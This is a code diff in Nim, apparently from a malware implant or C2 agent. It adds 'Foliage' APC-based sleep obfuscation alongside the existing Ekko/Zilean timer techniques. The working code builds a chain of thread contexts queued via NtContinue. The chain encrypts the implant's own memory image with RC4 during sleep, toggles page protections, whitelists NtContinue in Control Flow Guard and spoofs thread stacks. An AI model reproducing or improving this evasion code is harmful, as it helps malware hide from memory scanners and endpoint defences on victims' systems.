@@ -5,9 +5,10 @@ import os, system, strformat
 import ./cfg 
 import ../../common/[types, utils, crypto]
 
-# Sleep obfuscation implementation based on Ekko, originally developed by C5pider 
-# The code in this file was taken from the MalDev Academy modules 54, 56 & 59 and translated from C to Nim
+# Different sleep obfuscation techniques, reimplemented in Nim (Ekko, Zilean, Foliage) 
+# The code in this file was taken from the new MalDev Academy modules and translated from C to Nim
 # https://maldevacademy.com/new/modules/54
+# https://maldevacademy.com/new/modules/55
 # https://maldevacademy.com/new/modules/56
 
 type 
@@ -23,15 +24,26 @@ type
     WAIT_CALLBACK_ROUTINE = proc(Parameter: PVOID, TimerOrWaitFired: BOOLEAN): VOID 
     PWAIT_CALLBACK_ROUTINE = ptr WAIT_CALLBACK_ROUTINE
 
+    PS_APC_ROUTINE = proc(ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): VOID
+    PPS_APC_ROUTINE = ptr PS_APC_ROUTINE
+
 # Required APIs (definitions taken from NtDoc)
+# Ekko/Zilean
 proc RtlCreateTimerQueue*(phTimerQueueHandle: PHANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimerQueue"), dynlib: protect("ntdll.dll").}
 proc RtlDeleteTimerQueue(hQueue: HANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlDeleteTimerQueue"), dynlib: protect("ntdll.dll").}
 proc NtCreateEvent*(phEvent: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, eventType: EVENT_TYPE, initialState: BOOLEAN): NTSTATUS {.cdecl, stdcall, importc: protect("NtCreateEvent"), dynlib: protect("ntdll.dll").}
 proc RtlCreateTimer(queue: HANDLE, hTimer: PHANDLE, function: FARPROC, context: PVOID, dueTime: ULONG, period: ULONG, flags: ULONG): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimer"), dynlib: protect("ntdll.dll").}
 proc RtlRegisterWait( hWait: PHANDLE, handle: HANDLE, function: PWAIT_CALLBACK_ROUTINE, ctx: PVOID, ms: ULONG, flags: ULONG): NTSTATUS  {.cdecl, stdcall, importc: protect("RtlRegisterWait"), dynlib: protect("ntdll.dll").}
 proc NtSignalAndWaitForSingleObject(hSignal: HANDLE, hWait: HANDLE, alertable: BOOLEAN, timeout: PLARGE_INTEGER): NTSTATUS {.cdecl, stdcall, importc: protect("NtSignalAndWaitForSingleObject"), dynlib: protect("ntdll.dll").}
-proc NtDuplicateObject(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.cdecl, stdcall, importc: protect("NtDuplicateObject"), dynlib: protect("ntdll.dll").}
 proc NtSetEvent(hEvent: HANDLE, previousState: PLONG): NTSTATUS {.cdecl, stdcall, importc: protect("NtSetEvent"), dynlib: protect("ntdll.dll").}
+proc NtDuplicateObject(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.cdecl, stdcall, importc: protect("NtDuplicateObject"), dynlib: protect("ntdll.dll").}
+
+# Foliage 
+proc NtCreateThreadEx(threadHandle: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, processHandle: HANDLE, startRoutine: PVOID, argument: PVOID, createFlags: ULONG, zeroBits: ULONG, stackSize: ULONG, maximumStackSize: ULONG, attributeList: PVOID): NTSTATUS {.cdecl, stdcall, importc: protect("NtCreateThreadEx"), dynlib: protect("ntdll.dll").}
+proc NtGetContextThread(threadHandle: HANDLE, context: PCONTEXT): NTSTATUS {.cdecl, stdcall, importc: protect("NtGetContextThread"), dynlib: protect("ntdll.dll").}
+proc NtQueueApcThread(threadHandle: HANDLE, apcRoutine: PPS_APC_ROUTINE, apcArgument1: PVOID, apcArgument2: PVOID, apcArgument3: PVOID): NTSTATUS {.cdecl, stdcall, importc: protect("NtQueueApcThread"), dynlib: protect("ntdll.dll").}
+proc NtAlertResumeThread(threadHandle: HANDLE, suspendCount: PULONG): NTSTATUS {.cdecl, stdcall, importc: protect("NtAlertResumeThread"), dynlib: protect("ntdll.dll").}
+proc NtTestAlert(): NTSTATUS {.cdecl, stdcall, importc: protect("NtTestAlert"), dynlib: protect("ntdll.dll").}
 
 # Function for retrieving a random thread's thread context for stack spoofing
 proc GetRandomThreadCtx(): CONTEXT = 
@@ -68,16 +80,157 @@ proc GetRandomThreadCtx(): CONTEXT =
                 continue
 
             echo fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
-            break  
+            return ctx 
+    
+    echo protect("[-] No suitable thread for stack duplication found.")
+    return ctx  
 
-    return ctx
+# FOLIAGE sleep obfuscation based on Asynchronous Procedure Calls
+proc sleepFoliage*(sleepDelay: int) = 
+    
+    var 
+        status: NTSTATUS = 0
+        img: USTRING = USTRING(Length: 0)
+        key: USTRING = USTRING(Length: 0)
+        ctx: array[7, CONTEXT]
+        ctxInit: CONTEXT
+        hEventSync: HANDLE 
+        oldProtection: ULONG 
+        hThread: HANDLE 
+        
+    try: 
+        var 
+            NtContinue = GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtContinue"))
+            SystemFunction032 = GetProcAddress(LoadLibraryA(protect("Advapi32")), protect("SystemFunction032"))
+
+        # Add NtContinue to the Control Flow Guard allow list to make Ekko work in processes protected by CFG
+        discard evadeCFG(NtContinue)
+
+        # Locate image base and size
+        var imageBase = GetModuleHandleA(NULL)
+        var imageSize = (cast[PIMAGE_NT_HEADERS](imageBase + (cast[PIMAGE_DOS_HEADER](imageBase)).e_lfanew)).OptionalHeader.SizeOfImage
+
+        img.Buffer = cast[PVOID](imageBase)
+        img.Length = imageSize
+
+        # Generate random encryption key
+        var keyBuffer: string = Bytes.toString(generateBytes(Key16)) 
+        key.Buffer = keyBuffer.addr
+        key.Length = cast[DWORD](keyBuffer.len())
+
+        # Start synchronization event 
+        status = NtCreateEvent(addr hEventSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)
+        if status != STATUS_SUCCESS: 
+            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+            
+        # Start suspended thread where the APC calls will be queued and executed
+        status = NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL)
+        if status != STATUS_SUCCESS: 
+            raise newException(CatchableError, "NtCreateThreadEx " & $status.toHex())
+        echo fmt"[*] [{hThread.repr}] Thread created "
+
+        ctxInit.ContextFlags = CONTEXT_FULL
+        status = NtGetContextThread(hThread, addr ctxInit)
+        if status != STATUS_SUCCESS: 
+            raise newException(CatchableError, "NtGetContextThread " & $status.toHex())
+
+        # NtTestAlert is used to check if any user-mode APCs are pending for the calling thread and, if so, execute them.
+        # NtTestAlert will trigger all queued APC calls until the last element in the obfuscation chain, where ExitThread is called, terminating the thread.
+        cast[ptr PVOID](ctxInit.Rsp)[] = cast[PVOID](NtTestAlert)
+
+        # Preparing the ROP chain
+        for i in 0 ..< ctx.len(): 
+            copyMem(addr ctx[i], addr ctxInit, sizeof(CONTEXT))
+        
+        var gadget = 0
+
+        # ctx[0] contains a call to NtWaitForSingleObject, which waits for a synchronization signal to be triggered.
+        ctx[gadget].Rip = cast[DWORD64](NtWaitForSingleObject)
+        ctx[gadget].Rcx = cast[DWORD64](hEventSync)
+        ctx[gadget].Rdx = cast[DWORD64](FALSE)
+        ctx[gadget].R8  = cast[DWORD64](NULL)
+        inc gadget
+
+        # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
+        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
+        ctx[gadget].Rcx = cast[DWORD64](imageBase)
+        ctx[gadget].Rdx = cast[DWORD64](imageSize)
+        ctx[gadget].R8  = cast[DWORD64](PAGE_READWRITE)
+        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
+        inc gadget
+
+        # ctx[2] contains the call to SystemFunction032, which performs the actual payload memory obfuscation using RC4.
+        ctx[gadget].Rip = cast[DWORD64](SystemFunction032)
+        ctx[gadget].Rcx = cast[DWORD64](addr img)
+        ctx[gadget].Rdx = cast[DWORD64](addr key)
+        inc gadget
+
+        # ctx[3] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
+        ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
+        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
+        ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
+        ctx[gadget].R8  = cast[DWORD64](FALSE)
+        inc gadget
+        
+        # ctx[4] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
+        ctx[gadget].Rip = cast[DWORD64](SystemFunction032)
+        ctx[gadget].Rcx = cast[DWORD64](addr img)
+        ctx[gadget].Rdx = cast[DWORD64](addr key)
+        inc gadget
+
+        # ctx[5] contains the call to VirtualProtect to change the payload memory back to [R-X]
+        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
+        ctx[gadget].Rcx = cast[DWORD64](imageBase)
+        ctx[gadget].Rdx = cast[DWORD64](imageSize)
+        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
+        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
+        inc gadget
+        
+        # ctx[6] contains the final call, which exits the created thread after all APC calls have been executed.
+        ctx[gadget].Rip = cast[DWORD64](ExitThread)
+        ctx[gadget].Rcx = cast[DWORD64](0)
+
+        # Queueing the chain 
+        for i in 0 .. gadget: 
+            status = NtQueueApcThread(hThread, cast[PPS_APC_ROUTINE](NtContinue), addr ctx[i], cast[PVOID](FALSE), NULL)
+            if status != STATUS_SUCCESS: 
+                raise newException(CatchableError, "NtQueueApcThread " & $status.toHex())
+        
+        # Start sleep obfuscation
+        status = NtAlertResumeThread(hThread, NULL)
+        if status != STATUS_SUCCESS: 
+            raise newException(CatchableError, "NtAlertResumeThread " & $status.toHex())
+
+        echo protect("[*] Sleep obfuscation start.")
+
+        status = NtSignalAndWaitForSingleObject(hEventSync, hThread, TRUE, NULL)
+        if status != STATUS_SUCCESS: 
+            raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
+    
+        echo protect("[*] Sleep obfuscation end.")
+
+    except CatchableError as err: 
+        sleep(sleepDelay)
+        echo protect("[-] "), err.msg
+    
+    finally: 
+        if hEventSync != 0: 
+            CloseHandle(hEventSync)
+            hEventSync = 0 
+        if hThread != 0: 
+            CloseHandle(hThread)
+            hThread = 0
 
 # Timer based sleep obfuscation with stack spoofing (Ekko/Zilean)
-proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofStack: bool = true) = 
+proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofStack: var bool = true) = 
     
     echo fmt"[*] Using {$mode} for sleep obfuscation [Stack duplication: {$spoofStack}]."
 
     if sleepDelay == 0: 
+        return 
+
+    if mode == FOLIAGE: 
+        sleepFoliage(sleepDelay)
         return 
 
     var 
@@ -178,6 +331,11 @@ proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofSt
             # Create handle to the current process
             # Retrieve a random thread context from the current process
             ctxSpoof = GetRandomThreadCtx() 
+            if ctxSpoof == cast[CONTEXT](0): 
+                # If no suitable thread is found for stack spoofing, continue without it
+                spoofStack = false
+
+        if spoofStack: 
             status = NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
             if status != STATUS_SUCCESS: 
                 raise newException(CatchableError, "NtDuplicateObject " & $status.toHex())
@@ -228,7 +386,7 @@ proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofSt
 
         # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
         ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
-        ctx[gadget].Rcx = cast[DWORD64](cast[HANDLE](-1))
+        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
         ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
         ctx[gadget].R8  = cast[DWORD64](FALSE)
         inc gadget
